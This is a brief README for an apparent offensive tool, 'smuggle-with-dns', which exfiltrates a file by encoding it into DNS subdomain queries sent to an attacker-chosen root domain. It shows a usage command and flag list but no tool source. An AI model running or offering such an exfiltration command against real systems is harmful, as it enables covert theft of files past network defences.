# smuggle-with-dns
exfiltrate file with dns (for now)


simple tool to exfiltrate file with dns


# Usage
```bash
python3 swd.py --file path_to_file --domain root_domain --buffer length_of_string
```

# Setup
- ``` -h => help menu  ```
- ```  --file => path of file  ```
- ```  --domain => root domain to send request  ``` 
- ```  --buffer => subdomain string size, default 16  ```
